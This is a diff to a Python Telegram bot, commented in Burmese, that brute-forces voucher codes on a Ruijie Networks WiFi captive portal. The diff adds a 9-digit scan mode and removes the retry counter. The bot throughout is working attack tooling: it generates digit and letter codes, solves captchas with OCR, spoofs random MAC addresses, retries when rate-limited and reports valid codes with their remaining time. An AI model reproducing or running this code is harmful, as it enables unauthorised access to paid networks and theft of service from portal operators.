@@ -6,7 +6,7 @@ import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
 
-#ဒီနေရာမှာchangeပေးပါbro (env vars သုံးပြီ)
+#ဒီနေရာမှာchangeပေးပါbro
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
 GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
 ADMIN_ID = os.environ.get('ADMIN_ID', '')
@@ -23,7 +23,6 @@ success_messages = {}
 success_texts = {}
 limited_messages = {}
 limited_texts = {}
-retry_counts = {}
 captcha_state = {}
 session = None
 _connector = None
@@ -343,7 +342,7 @@ async def check_session_url(session_url):
         async with session.get(session_url, allow_redirects=True, headers=headers) as response:
             text_ = str(response.url)
             print(text_)
-            if "sessionId" in text_ or "gw_id" in text_:
+            if "sessionId" in text_:
                 return True
             else:
                 return False
@@ -364,7 +363,7 @@ async def handle_input(message):
         await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
         if await check_session_url(session_url=url):
             user_data[message.chat.id]['session_url'] = url
-            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
+            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, 9, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
         else:
             await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")
 
@@ -374,7 +373,7 @@ async def scan(message):
     if len(args) < 2:
         await bot.reply_to(
             message,
-            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
+            "Usage:\n\n/scan <6, 7, 8, 9, ascii-lower, all>"
         )
         return
     mode = args[1]
@@ -506,6 +505,9 @@ def iter_codes(mode):
     if mode == "8":
         while True:
             yield digit_generator(8)
+    if mode == "9":  # <-- 9 လုံးထည့်ပါ
+        while True:
+            yield digit_generator(9)
     if mode == "ascii-lower":
         while True:
             yield ascii_generator(6)
@@ -514,7 +516,7 @@ def iter_codes(mode):
             yield all_generator(6)
     raise ValueError(f"Unsupported scan mode: {mode}")
 
-def format_progress(checked, total=None, speed=0, retried=0):
+def format_progress(checked, total=None, speed=0):
     speed_str = f"{speed:,.0f} codes/min"
     if total is not None:
         bar_length = 20
@@ -526,14 +528,12 @@ def format_progress(checked, total=None, speed=0, retried=0):
             f"📦Checked : {checked:,}/{total:,}\n"
             f"📊Progress : {percent:.2f}%\n"
             f"⚡Speed : {speed_str}\n"
-            f"🔄Retried : {retried:,}\n"
             f"[{bar}]"
         )
     return (
         f"🔍Scanning Codes...\n\n"
         f"📦Checked : {checked:,}\n"
         f"⚡Speed : {speed_str}\n"
-        f"🔄Retried : {retried:,}\n"
         f"📊Status : running\n"
     )
 
@@ -545,7 +545,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
     except ValueError as e:
         await bot.send_message(chat_id, str(e))
         return
-    total = 10 ** int(mode) if mode in ["6", "7"] else None
+    total = 10 ** int(mode) if mode in ["6", "7", "9"] else None  # <-- 9 ထည့်ပါ
     checked = 0
     last_key_check = time.monotonic()
     scan_start = time.monotonic()
@@ -562,7 +562,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
                 scan_tasks.pop(chat_id, None)
                 success_messages.pop(chat_id, None)
                 success_texts.pop(chat_id, None)
-                retry_counts.pop(chat_id, None)
                 return
 
             batch = []
@@ -603,7 +602,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
 
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            text = format_progress(checked, total, speed, retry_counts.get(chat_id, 0))
+            text = format_progress(checked, total, speed)
             try:
                 await bot.edit_message_text(
                     chat_id=chat_id,
@@ -646,7 +645,6 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
         success_texts.pop(chat_id, None)
         limited_messages.pop(chat_id, None)
         limited_texts.pop(chat_id, None)
-        retry_counts.pop(chat_id, None)
 
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
@@ -690,14 +688,11 @@ def replace_mac(url, new_mac):
 def Minute_to_Hour(total_minutes):
     if total_minutes == 'Unknown':
         return 'Unknown'
-    
     total_m = int(total_minutes)
     if total_m == 0:
         return "Unlimited"
-        
     hours = total_m // 60
     minutes = total_m % 60
-    
     if hours > 0 and minutes > 0:
         return f"{hours}h {minutes}m"
     elif hours > 0:
@@ -729,7 +724,6 @@ async def Code_Expires_Date(session_id):
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as fresh_session:
-            # ပြင်ဆင်လိုက်သည့်နေရာ- API လမ်းကြောင်းအဟောင်း /macc2/ ကို /auth/ သို့ ပြောင်းလဲထားပါသည်
             async with fresh_session.get(
                 f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                 headers=headers
@@ -823,7 +817,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
         if response and 'request limited' in response:
             print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
-            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
             continue
         break
 
@@ -840,11 +833,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         expire_date = await Code_Expires_Date(session_id)
         success_texts[chat_id].append(f"🎫 <code>{code}</code>\n   {expire_date}")
         code_line = "\n\n".join(success_texts[chat_id])
-        
-        await SUCCESS_CODE.put({
-            "chat_id": chat_id,
-            "code": code
-        })
+
+        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
         if message:
             try:
                 if chat_id not in success_messages:
@@ -874,15 +864,15 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                             print(f"Success Fallback Error: {err}")
             except Exception as e:
                 print(f"Success Message Error: {e}")
-                
+
     elif 'STA' in response:
         if chat_id not in limited_texts:
             limited_texts[chat_id] = []
-            
+
         expire_date = await Code_Expires_Date(session_id)
         limited_texts[chat_id].append(f"⚠️ <code>{code}</code>\n   {expire_date}")
         limited_line = "\n\n".join(limited_texts[chat_id])
-        
+
         if message:
             try:
                 if chat_id not in limited_messages:
@@ -978,7 +968,6 @@ async def Varify_Captcha(session, session_id, text):
             return session_id
         else:
             return None
-
 
 async def start_polling():
     backoff = 5
